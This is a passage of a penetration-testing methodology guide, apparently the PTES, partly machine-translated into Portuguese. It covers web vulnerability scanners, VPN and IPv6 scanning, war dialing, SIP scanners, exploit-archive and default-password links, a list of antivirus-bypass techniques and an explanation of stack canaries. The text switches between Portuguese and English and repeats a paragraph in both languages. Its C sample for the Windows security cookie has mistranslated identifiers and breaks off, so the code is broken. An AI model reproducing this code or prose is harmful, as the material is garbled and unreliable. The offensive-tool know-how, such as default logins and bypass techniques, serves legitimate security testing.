[Captura de tela aqui](http://www.pentest-standard.org/index.php/File:Penetration_Testing_Execution_102.png "Arquivo:Execução de teste de penetração 102.png") 

Selecione "Restringir à pasta" para limitar o escopo da avaliação à área selecionada. Existem três opções disponíveis na lista suspensa. 

[Captura de tela aqui](http://www.pentest-standard.org/index.php/File:Penetration_Testing_Execution_103.png "Arquivo:Execução de teste de penetração 103.png") 

As opções são Somente diretório, Diretório e subdiretórios e Diretório e diretórios pai. Escolher a opção "Somente diretório" forçará um rastreamento e/ou auditoria apenas para o URL especificado. As opções "Diretório e subdiretórios" rastrearão e/ou auditarão na URL especificada, bem como nos diretórios subordinados. Ele não acessará nenhum diretório além do URL especificado. A opção "Diretório e diretórios pai" rastreará e/ou auditará o URL especificado, mas não acessará nenhum diretório subordinado. 

Depois de selecionar as opções apropriadas, clique em Avançar para continuar. 

Se o site de destino precisar ser acessado por meio de um servidor proxy, selecione Proxy de rede e escolha uma opção na lista Perfil de proxy. O padrão é Usar o Internet Explorer. As outras opções disponíveis são Autodetectar, Usar arquivo PAC, Usar configurações de proxy explícitas e Usar Mozilla Firefox. A detecção automática usa o Web Proxy Autodiscovery Protocol (WPAD) para localizar um arquivo de configuração automática de proxy e usá-lo para definir as configurações de proxy da Web do navegador. Usar arquivo PAC carrega configurações de proxy de um arquivo de configuração automática de proxy (PAC). Usar configurações de proxy explícitas permite especificar configurações do servidor proxy. Usar Mozilla Firefox importa as informações do servidor proxy do Firefox. 

[Captura de tela aqui](http://www.pentest-standard.org/index.php/File:Penetration_Testing_Execution_104.png "Arquivo:Execução de teste de penetração 104.png") 

A escolha de usar as configurações de proxy do navegador não garante que você conseguirá acessar a Internet por meio de um servidor proxy específico. Se as configurações do Internet Explorer estiverem configuradas para usar um proxy que não esteja em execução, você não conseguirá acessar o site para iniciar a avaliação. Por esse motivo, é sempre recomendável verificar as configurações de prosy do aplicativo selecionado. 

Selecione Autenticação de rede se a autenticação do servidor for necessária. Em seguida, escolha o método de autenticação específico e insira suas credenciais de rede. Clique em próximo para continuar. 

As opções Cobertura e Integridade geralmente não são modificadas, a menos que você esteja direcionando um site Oracle. 

[Captura de tela aqui](http://www.pentest-standard.org/index.php/File:Penetration_Testing_Execution_105.png "Arquivo:Execução de teste de penetração 105.png")

Para otimizar as configurações de um site Oracle, selecione Estrutura e escolha o tipo de site na lista Otimizar verificação para. Use o controle deslizante Rastreamento para especificar as configurações do rastreador. 

Se ativado, o controle deslizante permite selecionar uma das quatro posições de rastreamento. As opções são Completa, Padrão, Normal e Rápida. As configurações específicas são as seguintes: 

Completo usa as seguintes configurações: 

- Detecção de página redundante: DESLIGADA
- Máximo de acessos de URL único: 20
- Máximo de envios de formulários da Web: 7
- Criar sessões de evento de script: ATIVADO
- Máximo de eventos de script por página: 2.000
- Número de formulários dinâmicos permitidos por sessão: Ilimitado
- Incluir parâmetros na contagem de ocorrências: verdadeiro

O padrão usa as seguintes configurações: 

- Detecção de página redundante: DESLIGADA
- Máximo de acessos de URL único: 5
- Máximo de envios de formulários da Web: 3
- Criar sessões de evento de script: ATIVADO
- Máximo de eventos de script por página: 1.000
- Número de formulários dinâmicos permitidos por sessão: Ilimitado
- Incluir parâmetros na contagem de ocorrências: verdadeiro

Normal usa as seguintes configurações: 

- Detecção de página redundante: DESLIGADA
- Máximo de acessos de URL único: 5
- Máximo de envios de formulários da Web: 2
- Criar sessões de evento de script: ATIVADO
- Máximo de eventos de script por página: 300
- Número de formulários dinâmicos permitidos por sessão: 1
- Incluir parâmetros na contagem de ocorrências: falso

Rápido usa as seguintes configurações: 

- Detecção de página redundante: ATIVADA
- Máximo de acessos de URL único: 3
- Máximo de envios de formulários da Web: 1
- Criar sessões de evento de script: DESATIVADO
- Máximo de eventos de script por página: 100
- Número de formulários dinâmicos permitidos por sessão: 0
- Incluir parâmetros na contagem de ocorrências: falso

Selecione a posição de rastreamento apropriada e clique em Avançar para continuar. 

[Captura de tela aqui](http://www.pentest-standard.org/index.php/File:Penetration_Testing_Execution_106.png "Arquivo:Execução de teste de penetração 106.png") 

Certifique-se de que a caixa de seleção Executar Profiler Automaticamente esteja marcada. Clique em próximo para continuar. 

[Captura de tela aqui](http://www.pentest-standard.org/index.php/File:Penetration_Testing_Execution_107.png "Arquivo:Execução de teste de penetração 107.png") 

Neste ponto, a varredura foi configurada corretamente. Existe uma opção para salvar as configurações de digitalização para uso posterior. Clique em Digitalizar para sair do assistente e iniciar a digitalização. 

Assim que você inicia uma avaliação de site, o WebInspect exibe no painel de navegação um ícone representando cada sessão. Ele também relata possíveis vulnerabilidades na guia Vulnerabilidades e na guia Informações no painel Resumo. Se você clicar em uma URL listada no painel Resumo, o programa destacará a sessão relacionada no painel Navegação e exibirá as informações associadas no painel Informações. A gravidade relativa de uma vulnerabilidade listada no painel Navegação é identificada pelo ícone associado. 

[Captura de tela aqui](http://www.pentest-standard.org/index.php/File:Penetration_Testing_Execution_108.png "Arquivo:Execução de teste de penetração 108.png")


Ao conduzir ou visualizar uma verificação, o painel de navegação fica no lado esquerdo da janela do WebInspect. Inclui os botões Site, Sequence, Search e Step Mode, que determinam a visualização apresentada. 

Ao realizar ou visualizar uma varredura, o painel Informações contém três painéis de informações dobráveis ​​e uma área de exibição de informações. Selecione o tipo de informação a ser exibida clicando em um item em um dos três painéis de informações na coluna da esquerda. 

O painel Resumo possui cinco guias: Vulnerabilidades, Informações, Melhores Práticas, Log de Verificação e Informações do Servidor. A guia Vulnerabilidades lista todas as vulnerabilidades descobertas durante uma auditoria. A guia Informações lista as informações descobertas durante uma avaliação ou rastreamento. Estas não são consideradas vulnerabilidades, mas simplesmente identificam pontos interessantes no site ou em determinadas aplicações ou servidores Web. A guia Melhores Práticas lista problemas detectados pelo WebInspect relacionados às melhores práticas comumente aceitas para desenvolvimento Web. Os itens listados aqui não são vulnerabilidades, mas são indicadores da qualidade geral do site e das práticas de segurança de desenvolvimento do site (ou da falta delas). 

A guia Scan Log é usada para visualizar informações sobre a avaliação. Por exemplo, o momento em que determinada auditoria foi realizada em relação ao alvo. Finalmente, a guia Informações do Servidor lista itens de interesse pertencentes ao servidor. 

[Captura de tela aqui](http://www.pentest-standard.org/index.php/File:Penetration_Testing_Execution_109.png "Arquivo:Execução de teste de penetração 109.png") 

A etapa final é exportar os resultados para análise posterior. Para exportar os resultados da análise para um arquivo XML, clique em Arquivo e em Exportar. Isso apresenta a opção de exportar a digitalização ou os detalhes da digitalização. 

[Captura de tela aqui](http://www.pentest-standard.org/index.php/File:Penetration_Testing_Execution_110.png "Arquivo:Execução de teste de penetração 110.png") 

Na janela Exportar detalhes da digitalização, precisamos escolher a opção Completo em Detalhes. Isso garantirá que obtenhamos o relatório mais abrangente possível. Como isso está disponível apenas no formato XML, a única opção que nos resta é limpar os dados. Se você deseja garantir que os dados do SSN e do cartão de crédito sejam limpos, selecione essas opções. Se você optar por limpar as informações do endereço IP, os dados exportados serão inúteis para nossos propósitos. Clique em Exportar para continuar. Escolha o local do arquivo para salvar os dados exportados. 

**Verificação de avaliação de serviço da Web**

A primeira verificação executada com o WebInspect é a verificação de avaliação do site. O WebInspect usa o Assistente de avaliação de novo site para configurar as varreduras de avaliação. 

[Captura de tela aqui](http://www.pentest-standard.org/index.php/File:Penetration_Testing_Execution_111.png "Arquivo:Execução de teste de penetração 111.png") 

Quando você inicia o assistente Novo, a janela Assistente de verificação de serviço da Web é exibida. As opções exibidas nas janelas do assistente são extraídas das configurações padrão do WebInspect. O importante a observar é que quaisquer alterações feitas serão usadas apenas para esta verificação. 

Na caixa Nome da verificação, insira um nome ou uma breve descrição da verificação. Em seguida, você precisa selecionar um modo de avaliação. As opções disponíveis são Somente rastreamento e Rastreamento e auditoria. A opção "Somente rastreamento" mapeia completamente a estrutura em árvore de um site. É possível, após a conclusão de um rastreamento, clicar em "Auditoria" para avaliar as vulnerabilidades de um aplicativo. "Rastreamento e Auditoria" mapeia a estrutura hierárquica de dados do site e audita cada página à medida que ela é descoberta. 

[Captura de tela aqui](http://www.pentest-standard.org/index.php/File:Penetration_Testing_Execution_112.png "Arquivo:Execução de teste de penetração 112.png") 

Depois de selecionar o modo de avaliação, você precisará selecionar o local do arquivo WSDL. WSDL é um formato XML para descrever serviços de rede como um conjunto de terminais operando em mensagens contendo informações orientadas a documentos ou orientadas a procedimentos. Depois de selecionar as opções apropriadas, clique em Avançar para continuar. 

[Captura de tela aqui](http://www.pentest-standard.org/index.php/File:Penetration_Testing_Execution_113.png "Arquivo:Execução de teste de penetração 113.png") 

Neste ponto, a varredura foi configurada corretamente. Existe uma opção para salvar as configurações de digitalização para uso posterior. Clique em Digitalizar para sair do assistente e iniciar a digitalização. 

Assim que você inicia uma avaliação de serviço da Web, o WebInspect exibe no painel de navegação um ícone representando cada sessão. Ele também relata possíveis vulnerabilidades na guia Vulnerabilidades e na guia Informações no painel Resumo. Se você clicar em uma URL listada no painel Resumo, o programa destacará a sessão relacionada no painel Navegação e exibirá as informações associadas no painel Informações. A gravidade relativa de uma vulnerabilidade listada no painel Navegação é identificada pelo ícone associado. 

[Captura de tela aqui](http://www.pentest-standard.org/index.php/File:Penetration_Testing_Execution_114.png "Arquivo:Execução de teste de penetração 114.png") 

Ao conduzir ou visualizar uma verificação, o painel de navegação fica no lado esquerdo da janela do WebInspect. Inclui os botões Site, Sequence, Search e Step Mode, que determinam a visualização apresentada. 

Ao realizar ou visualizar uma varredura, o painel Informações contém três painéis de informações dobráveis ​​e uma área de exibição de informações. Selecione o tipo de informação a ser exibida clicando em um item em um dos três painéis de informações na coluna da esquerda. 

O painel Resumo possui cinco guias: Vulnerabilidades, Informações, Melhores Práticas, Log de Verificação e Informações do Servidor. A guia Vulnerabilidades lista todas as vulnerabilidades descobertas durante uma auditoria. A guia Informações lista as informações descobertas durante uma avaliação ou rastreamento. Estas não são consideradas vulnerabilidades, mas simplesmente identificam pontos interessantes no site ou em determinadas aplicações ou servidores Web. A guia Melhores Práticas lista problemas detectados pelo WebInspect relacionados às melhores práticas comumente aceitas para desenvolvimento Web. Os itens listados aqui não são vulnerabilidades, mas são indicadores da qualidade geral do site e das práticas de segurança de desenvolvimento do site (ou da falta delas). 

A guia Scan Log é usada para visualizar informações sobre a avaliação. Por exemplo, o momento em que determinada auditoria foi realizada em relação ao alvo. Finalmente, a guia Informações do Servidor lista itens de interesse pertencentes ao servidor. 

[Captura de tela aqui](http://www.pentest-standard.org/index.php/File:Penetration_Testing_Execution_115.png "Arquivo:Execução de teste de penetração 115.png") 

A etapa final é exportar os resultados para análise posterior. Para exportar os resultados da análise para um arquivo XML, clique em Arquivo e em Exportar. Isso apresenta a opção de exportar a digitalização ou os detalhes da digitalização. 

[Captura de tela aqui](http://www.pentest-standard.org/index.php/File:Penetration_Testing_Execution_116.png "Arquivo:Execução de teste de penetração 116.png") 

From the Export Scan Details window we need to choose the Full from the Details option. This will ensure that we obtain the most comprehensive report possible. Since this is only available in XML format, the only option we have left to choose is to scrub data. If you want to ensure that SSN, and Credit Card data is scrubbed then select these options. If you choose to scrub IP address information then the exported data will be useless for our purposes. Click Export to continue. Choose the file location to save the exported data. 
###### **IBM AppScan**
IBM Rational AppScan automates application security testing by scanning applications, identifying vulnerabilities and generating reports with recommendations to ease remediation. This tutorial will apply to the AppScan Standard Edition which is a desktop solution to automate Web application security testing. It is intended to be use by small security teams with several security testers. 

<AppScan01 Screen Shot Here> 

To ensure APPScan has the latest updates you should click update on the toolbar menu. This will check the IBM servers for updates. Internet access is required. 

<AppScan02 Screen Shot Here> 

The simplest way to configure a scan is to use the Configuration Wizard. You can access the Configuration Wizard by clicking “New” on the File menu. You will be presented with the “New Scan” dialog box. Enable or disable the “Configuration Wizard” by checking the box. 

<AppScan03 Screen Shot Here> 

You can then choose what type of scan you wish to perform. The default is a Web Application Scan. 


<AppScan04 Screen Shot Here> 

You then have to enter the starting URL for the web application. Other options on that screen include choosing Case-Sensitivity path for Unix\Linux systems, adding additional servers and domains and enabling proxy and platform authentication option. Uncheck the case-sensitivity path option if you know all the systems are windows as it can help reduce the scan time. 

<AppScan05 Screen Shot Here> 

If the web application requires authentication then there are several options to choose from. Recorded allows you to record the login procedure so that AppScan can perform the login automatically. Prompt will prompt with the login screen during the scan when a login is required. Automatic can be used in web applications that only require a username and password. An important option is the “I want to configure In-Session detection options” if anything other they “None” is chosen. This option automatically detects if the web application is out of session. AppScan with automatically configure this feature but if it’s not correct scan results will be unreliable. 

<AppScan06 Screen Shot Here> 


<AppScan06a Screen Shot Here> 

Next you will be asked to choose a test policy. There are various built-in policies and each have various inclusions and exclusions. You can also create a custom policy. 

By default AppScan tests the login and logout pages. This is enabled with the “Send tests on login and logout pages” option. Some applications have safeguards that could lockout the test account and prevent a scan from completing. You need monitor the testing logs to ensure login is not failing. AppScan also deletes previous session tokens before testing login pages. You may need to disable this option if a valid session token is required on the login pages. This can disabled by unchecking the “Clear session identifiers before testing login pages” option 

<AppScan07 Screen Shot Here> 

You have now completed the scan configuration and will be prompted to start the scan. By default AppScan will start a full scan of the application. To ensure full coverage of the application a Manual Explore of the application is preferred. With this option AppScan with provide you with a browser window and you can access the application to explore every option and feature available. Once the full application has been explored you can close the browser and AppScan will add the discovered pages its list for testing. You can then start the full scan (Using ScanàFull Scan on the menu bar) and AppScan will automatically scan the application. 


<AppScan08 Screen Shot Here> 
###### **Web Directory Listing/Bruteforcing**
DirBuster is a java application that is designed to brute force web directories and files names. DirBuster attempts to find hidden or obfuscated directories, but as with any bruteforcing tool, it is only as good as the directory and file list utilized. For that reason, DirBuster has 9 different lists. 

[Screenshot Here](http://www.pentest-standard.org/index.php/File:Penetration_Testing_Execution_117.png "Arquivo:Execução de teste de penetração 117.png")
###### **Webserver Version/Vulnerability Identification**
The ability to identify the Webserver version is critical to identify vulnerabilities specific to a particular installation. This information should have been gathered as part of an earlier phase. 
##### **NetSparker (Windows)**
NetSparker is windows based Web Application Scanner. This scanner tests for all common types of web application security flaws. This scanner allows the user to enter NTLM, Forms based and certificate based credentials. NetSparker boasts its ability to confirm the findings it presents to the user. NetSparker is an inexpensive Web Application Scanner. 

When launching NetSparker, the user is presented with the following screen, which has tabs for the Scan Settings, Authentication and Advanced Settings. 

<netsparker1.png ScreenShot Here> 

NetSparker allows the user to enter credentials for Forms based Authentication in the following dialogue. 

<netsparker2.png ScreenShot Here> 

Once credentials have been entered, NetSparker presents those to the web application in a mini-browser view as seen below. 

<netsparker3.png ScreenShot Here> 

The below confirms that NetSparker is able to use the supplied credentials to login to the application. 

<netsparker4.png ScreenShot Here> 

In an effort to make sure that NetSparker knows when it has logged itself out of the web application, the user is able to specify the logged in and logged out conditions. 

<netsparker5.png ScreenShot Here> 

The final step of the process confirms the settings are configured correctly. 

<netsparker6.png ScreenShot Here> 

NetSparker offers five different methods to start the scan as seen below. These include Start Scan, Crawl and Wait, Manual Crawl (Proxy Mode), Scan Imported Links Only and Schedule Scan. 

<netsparker7.png ScreenShot Here> 

The scan starts with a crawl of the website and classifies the potential security issues as seen below. 

<netsparker8.png ScreenShot Here> 

The next phase is attacking the website. This begins to show identified vulnerabilities as shown in this screenshot. 

<netsparker9.png ScreenShot Here> 

Each finding can be shown in a Browser View as shown in this screenshot. 

<netsparker10.png ScreenShot Here> 

The vulnerability can also be displayed in an HTTP Request / Response format as seen in this screenshot. 

<netsparker11.png ScreenShot Here> 

To check the status of the scan, click on View and select Dashboard. 

<netsparker12.png ScreenShot Here> 

Also included is the Vulnerability Chart 

<netsparker13.png ScreenShot Here> Reporting options include PDF, HTML, CSV and XML formats. 
##### **Specialized Vulnerability Scanners**
###### **Virtual Private Networking (VPN)**
Virtual Private Networking (VPN) involves "tunneling" private data through the Internet. The four most widely known VPN "standards" are Layer 2 Forwarding (L2F), IP Security (IPSec), Point-to-Point Tunneling Protocol (PPTP), and Layer 2 Tunneling Protocol (L2TP). VPN servers generally will not be detected by a port scans as they don't listen on TCP ports, so a TCP port scan won't find them. In addition, they won't normally send ICMP unreachable messages, so a UDP port scans more than likely won't find them. This is why we need specialized scanners to find and identify them. 

**ike-scan**

ike-scan is a command-line IPsec VPN scanning, fingerprinting and testing tool that uses the IKE protocol to discover, fingerprint and test IPsec VPN servers. Ike-scan sends properly formatted IKE packet to each of the address you wish to scan and displays the IKE responses that are received. While ike-scan has a dozens of options, we will only cover the basics here. 

[Screenshot Here](http://www.pentest-standard.org/index.php/File:Penetration_Testing_Execution_118.png "Arquivo:Execução de teste de penetração 118.png")

Using ike-scan to actually perform VPN discovery is relatively straight forward. Simply give it a range and it will attempt to identify 

[Screenshot Here](http://www.pentest-standard.org/index.php/File:Penetration_Testing_Execution_119.png "Arquivo:Execução de teste de penetração 119.png")
###### **IPv6**
The THC-IPV6 Attack Toolkit is a complete set of tools to scan for inherent protocol weaknesses of IPv6 deployments. Implementation6 which performs various implementation checks on IPv6. 

[Screenshot Here](http://www.pentest-standard.org/index.php/File:Penetration_Testing_Execution_120.png "Arquivo:Execução de teste de penetração 120.png")

Exploit6 is another tool from the THC-IPV6 Attack Toolkit which can test for known ipv6 vulnerabilities. 

[Screenshot Here](http://www.pentest-standard.org/index.php/File:Penetration_Testing_Execution_121.png "Arquivo:Execução de teste de penetração 121.png")

[Screenshot Here]
###### **War Dialing**
War dialing is process of using a modem to automatically scan a list of telephone numbers, usually dialing every number in a local area code to search for computers, Bulletin board systems and fax machines. 

**WarVOX**

WarVOX is a suite of tools for exploring, classifying, and auditing telephone systems. Unlike normal wardialing tools, WarVOX works with the actual audio from each call and does not use a modem directly. This model allows WarVOX to find and classify a wide range of interesting lines, including modems, faxes, voice mail boxes, PBXs, loops, dial tones, IVRs, and forwarders. WarVOX provides the unique ability to classify all telephone lines in a given range, not just those connected to modems, allowing for a comprehensive audit of a telephone system. VoIP 

VoIP networks rely on the network infrastructure that just simply targeting phones and servers is like leaving half the scope untouched. The intelligence gathering phase should have resulted in identify all network devices, including routers and VPN gateways, web servers, TFTP servers, DNS servers, DHCP servers, RADIUS servers, and firewalls. Note: The default username is admin with a password of warvox. 

[Screenshot Here]

**iWar**

iWar is a War dialer written for Linux, FreeBSD, OpenBSD, etc. 

[Screenshot Here](http://www.pentest-standard.org/index.php/File:Penetration_Testing_Execution_123.png "Arquivo:Execução de teste de penetração 123.png")

**Plain Analog Wardialer (PAW) / Python Advanced Wardialing System (PAWS)**

PAW / PAWS is a wardialing software in python. It is designed to scan for ISDN (PAWS only) and newer analog modems. 

[Screenshot Here](http://www.pentest-standard.org/index.php/File:Penetration_Testing_Execution_124.png "Arquivo:Execução de teste de penetração 124.png")

**SIPSCAN**

SIPSCAN uses REGISTER, OPTIONS and INVITE request methods to scan for live SIP extensions and users. SIPSCAN comes with a list of usernames (users.txt) to brute force. This should be modified to include data collected during earlier phases to target the specific environment. 

[Screenshot Here](http://www.pentest-standard.org/index.php/File:Penetration_Testing_Execution_125.png "Arquivo:Execução de teste de penetração 125.png")

**SIPSAK**

SIPSAK is tool that can test for SIP enabled applications and devices using the OPTION request method only. 

[Screenshot Here](http://www.pentest-standard.org/index.php/File:Penetration_Testing_Execution_126.png "Arquivo:Execução de teste de penetração 126.png")

**SVMAP**

SVMAP is a part of the SIPVicious suite and it can be used to scan identify and fingerprint a single IP or a range of IP addresses. Svmap allows specifying the method being used such as OPTIONS, INVITE, and REGISTER. 

[Screenshot Here](http://www.pentest-standard.org/index.php/File:Penetration_Testing_Execution_127.png "Arquivo:Execução de teste de penetração 127.png")
#### **Passive Testing**
Passive Testing is exactly what it sounds like. Testing for vulnerabilities but doing so in a passive manner. This is often best left to automated tools, but it can be accomplished by manually methods as well. 
##### **Automated Tools**
###### **Traffic Monitoring**
Traffic Monitoring is a passive mechanism for gathering further information about the targets. This can be helpful in determining the specifics of an operating system or network device. There are times when active fingerprinting may indicate, for example, an older operating system. This may or may not be the case. Passive fingerprinting is essentially a "free" way to ensure that the data you are reporting is as accurate as possible. 

**P0f**

P0f is an awesome passive fingerprinting tool. P0f can identify the operating system on based upon machines you connect to and that you connect to as well as machines that you cannot connect to. Also, it can fingerprint machines based upon the communications that your interfaces can observe. 

[Screenshot Here](http://www.pentest-standard.org/index.php/File:Penetration_Testing_Execution_128.png "Arquivo:Execução de teste de penetração 128.png")
##### **Wireshark**
Wireshark is a free and open-source packet analyzer. It is used for network troubleshooting, analysis, software and communications protocol development, and education. Originally named Ethereal, in May 2006 the project was renamed Wireshark due to trademark issues. 

Wireshark is cross-platform, using the GTK+ widget toolkit to implement its user interface, and using pcap to capture packets; it runs on various Unix-like operating systems including Linux, Mac OS X, BSD, and Solaris, and on Microsoft Windows. 

[Screenshot Here](http://www.pentest-standard.org/index.php/File:Penetration_Testing_Execution_129.png "Arquivo:Execução de teste de penetração 129.png")
##### **Tcpdump**
Tcpdump is a common packet analyzer that runs under the command line. It allows the user to intercept and display TCP/IP and other packets being transmitted or received over a network to which the computer is attached. Tcpdump works on most Unix-like operating systems: Linux, Solaris, BSD, Mac OS X, HP-UX and AIX among others. In those systems, tcpdump uses the libpcap library to capture packets. 

There is also a port of tcpdump for Windows called WinDump; this uses WinPcap, which is a port of libpcap to Windows. 

[Screenshot Here](http://www.pentest-standard.org/index.php/File:Penetration_Testing_Execution_130.png "Arquivo:Execução de teste de penetração 130.png")
##### **Metasploit Scanners**
###### **Metasploit Unleashed**
The [Metasploit Unleashed](http://www.offensive-security.com/metasploit-unleashed/Vulnerability_Scanning) course has several tutorials on performing vulnerability scanning leveraging the Metasploit Framework. 
### **Vulnerability Validation**
#### **Public Research**
A product of the vast amount of security research is the discovery of vulnerabilities and associated Proof of Concept (PoC) and/or exploit code. The results from the vulnerability identification phase must be individually validated and where exploits are available, these must be validated. The only exception would be an exploit that results in a Denial of Service (DoS). This would need to be included in the scope to be considered for validation. There are numerous sites that offer such code for download that should be used as part of the Vulnerability Analysis phase. 

- Exploit-db - [http://www.exploit-db.com](http://www.exploit-db.com/)
- Security Focus - [http://www.securityfocus.com](http://www.securityfocus.com/)
- Packetstorm - [http://www.packetstorm.com](http://www.packetstorm.com/)
- Security Reason - [http://www.securityreason.com](http://www.securityreason.com/)
- Black Asylum - <http://www.blackasylum.com/?p=160>
##### **Common/default passwords**
Attempt to identify if a device, application, or operating system is vulnerable to a default credential attack is really as simple as trying to enter in known default passwords. Default passwords can be obtained from the following websites:

- <http://www.phenoelit-us.org/dpl/dpl.html>
- <http://cirt.net/passwords>
- [http://www.defaultpassword.com](http://www.defaultpassword.com/)
- [http://www.passwordsdatabase.com](http://www.passwordsdatabase.com/)
- <http://www.isdpodcast.com/resources/62k-common-passwords/>
#### **Establish target list**
Identifying all potential targets is critical to penetration testing. Properly established target lists ensure that attacks are properly targeted. If the particular versions of software running in the environment can be identified, the tester is dealing with a known quantity, and can even replicate the environment. A properly defined target list should include a mapping of OS version, patch level information. If known it should include web application weaknesses, lockout thresholds and weak ports for attack. 
##### **Mapping Versions**
Version checking is a quick way to identify application information. To some extent, versions of services can be fingerprinted using nmap, and versions of web applications can often be gathered by looking at the source of an arbitrary page. 
##### **Identifying Patch Levels**
To identify the patch level of services internally, consider using software which will interrogate the system for differences between versions. Credentials may be used for this phase of the penetration test, provided the client has acquiesced. Vulnerability scanners are particularly effective at identifying patch levels remotely, without credentials. 
##### **Looking for Weak Web Applications**
Identifying weak web applications can be a particularly fruitful activity during a penetration test. Things to look for include OTS applications that have been misconfigured, OTS application which have plugin functionality (plugins often contain more vulnerable code than the base application), and custom applications. Web application fingerprinters such as WAFP can be used here to great effect. 
##### **Identify Weak Ports and Services**
Identifying weak ports can be done using banner grabbing, nmap and common sense. Many ports and services will lie, or mislead about the specifics of their version. 
##### **Identify Lockout threshold**
Identifying the lockout threshold of an authentication service will allow you to ensure that your bruteforce attacks do not intentionally lock out valid users during your testing. Identify all disparate authentication services in the environment, and test a single, innocuous account for lockout. Often 5 - 10 tries of a valid account is enough to determine if the service will lock users out. 
### **Attack Avenues**
Attack avenues focus on identifying all potential attack vectors that could be leveraged against a target. This is much more detailed than simply looking at the open or filtered ports, but evaluates the Footprinting information and automated results in an effort to create an attack tree. 
#### **Creation of Attack Trees**
Attack trees are conceptual diagrams of threats on target systems and should include all possible attack methods to reach those threats. 
#### **Identify protection mechanisms**
There is no magic bullet for detecting and subverting Network or Host based protection mechanisms. It takes skill and experience. This is beyond the scope of this document, which only lists the relevant protection mechanisms and describes what they do. 
##### **Network protections**
###### **"Simple" Packet Filters**
Packet filters are rules for classifying packets based on their header fields. Packet classification is essential to routers supporting services such as quality of service (QoS), virtual private networks (VPNs), and firewalls. 
###### **Traffic shaping devices**
Traffic shaping is the control of computer network traffic in order to optimize or guarantee performance, improve latency, and/or increase usable bandwidth for some kinds of packets by delaying other kinds of packets that meet certain criteria. During penetration test traffic shaping can also control the volume of traffic being sent into a network in a specified period, or the maximum rate at which the traffic is sent. For these reasons; traffic shaping is important to detect at the network edges to avoid packet dropping and packet marking. 
###### **Data Loss Prevention (DLP) systems**
Data Loss Prevention (DLP) refers to systems that identify, monitor, and protect data in use, data in motion, and data at rest via content inspection and contextual analysis of activities (attributes of originator, data object, medium, timing, recipient/destination and so on). DLP systems are analogous to intrusion-prevention system for data. 
##### **Host based protections**
Host-based protections usually revolve around an installed software package which monitors a single host for suspicious activity by analyzing events occurring within that host. The majority of Host-based protections utilize one of three detection methods: signature-based, statistical anomaly-based and stateful protocol analysis. 
###### **Stack/heap protections**
Numerous tools are available that can monitor the host to provide protections against buffer overflows. Microsoft's Data Execution Prevention mode is an example that is designed to explicitly protect the pointer to the SEH Exception Handler from being overwritten. 
###### **Whitelisting**
Whitelisting provides a list of entities that are being provided a particular privilege, service, mobility, access, or recognition. An emerging approach in combating attacks by viruses and malware is to whitelist software which is considered safe to run, blocking all others 
###### **AV/Filtering/Behavioral Analysis**
Behavioral analysis works from a set of rules that define a program as either legitimate, or malicious. Behavioral analysis technology monitors what an application or piece of code does and attempts to restrict its action. Examples of this might include applications trying to write to certain parts of a system registry, or writing to pre-defined folders. These and other actions would be blocked, with the actions notified to the user or administrator. 
##### **Application level protections**
## **Exploitation**
### **Precision strike**
Additional information on exploitation can be found at the [Metasploit Unleashed](http://www.offensive-security.com/metasploit-unleashed/Exploit_Development) course. 
#### **Countermeasure Bypass**
<Contribution Needed>
##### **AV**
<Contribution Needed>

- Encoding
- Packing
- Whitelist Bypass
- Process Injection
- Purely Memory Resident
##### **Human**
<Contribution Needed>
##### **HIPS**
<Contribution Needed>
##### **DEP**
<Contribution Needed>
##### **ASLR**
<Contribution Needed>
##### **VA + NX (Linux)**
<Contribution Needed>
##### **w^x (OpenBSD)**
<Contribution Needed>
##### **WAF**
A WAF (Web application firewall) is a firewall which can be installed in front of (network topology speaking) a web application. The WAF will analyze each request and look for common web attacks such as Cross Site Scripting and SQLinjection. Like most AV scanners, a blacklisting mechanism is often used to find these potentially malicious HTTP requests (often regex). Since these WAFs are using this blacklisting technique, multiple papers exist on bypassing these types of devices. 
##### **Stack Canaries**
Para entender o uso do Stack Canaries, é preciso entender a falha fundamental dos buffer overflows. Um buffer overflow ocorre quando um aplicativo não consegue verificar adequadamente o comprimento da entrada recebida com o comprimento do buffer na memória para o qual esses dados são copiados. Devido à forma como a pilha é construída e à forma como os dados são inseridos na pilha, a entrada recebida pode ser usada para sobrescrever o EIP (ponteiro de instrução estendido, usado pelo aplicativo para saber de onde o aplicativo veio antes de copiando a entrada para o buffer). Quando um invasor controla o EIP, a execução da aplicação pode ser alterada de forma que o invasor tenha controle total da aplicação. Uma solução potencial é adicionar um "cookie" ou canário de pilha logo após o buffer na pilha. Quando a aplicação deseja retornar, o valor do canário da pilha é verificado. Se este valor tiver sido alterado, o programa irá ignorar o EIP e travar, tornando o buffer overflow ineficaz. 

Cada sistema operacional calcula um cookie diferente. 

###### **Microsoft Windows**
O cookie no Windows é adicionado pelo Visual Studio. Uma das opções ao compilar uma aplicação é /GS. A opção está habilitada por padrão. O cookie é calculado usando algumas variáveis ​​específicas do processo. Abaixo está um código representativo de como esse cookie é calculado. 

void generate\_security\_cookie() { 

`	`int defaultval1 = 0xFFFF0000; 

`	`int valor padrão2 = 0xBB40E64E; // Valor hexadecimal do PI sem vírgula... 

`	`int result = 0; 

`	`int resultadocomp = 0; 

`	`FILETIME arquivotimestruct ; 

`	`GetSystemTimeAsFileTime(&filetimestruct); 

`	`contador de desempenho LARGE\_INTEGER; 

`	`QueryPerformanceCounter(&perfcounter); 

`	`int tickc = GetTickCount(); 

`	`int threadid = GetCurrentThreadId(); 

`	`int processid = GetCurrentProcessId(); 

`	`resultado = resultado ^ filetimestruct.dwHighDateTime; 

`	`resultado = resultado ^ filetimestruct.dwLowDateTime; 

`	`resultado = resultado ^ threadid; 

`	`resultado = resultado ^ processid; 

`	`resultado = resultado ^ tickc; 

`	`resultado = resultado ^ perfcounter.HighPart; 

`	`resultado = resultado ^ perfcounter.LowPart; 

`	`if (resultado == defaultval2) { 

`		`printf("Uau, o que há de estranho em obter o mesmo valor do início"); 

`		`resultado = 0xBB40E64E; 

`	`} else { 

`		`if (!(resultado & defaultval1)) { 



`			`int temp = (resultado | 0x4711) << 16; 

`			`resultado |= temperatura; 

`		`} 

`	`} 

`	`resultadocomp = ~resultado;	

Como você pode ver, alguns desses valores não são difíceis de descobrir. Exceto talvez o LowDateTime e o contador de desempenho. Um excelente artigo foi escrito sobre essa falta de entropia. Mais informações podem ser encontradas nesse artigo aqui ( [Explorando o que de outra forma não seria explorável](http://j00ru.vexillium.org/?p=690) ) 
###### **Linux**
Como no Windows, o compilador padrão, gcc, adiciona o código para a pilha canário. Este código pode ser encontrado no arquivo libssp/ssp.c 

static void \_\_attribute\_\_ ((construtor)) 

\_\_guard\_setup (void) 

{ 

`  `unsigned char \*p; 

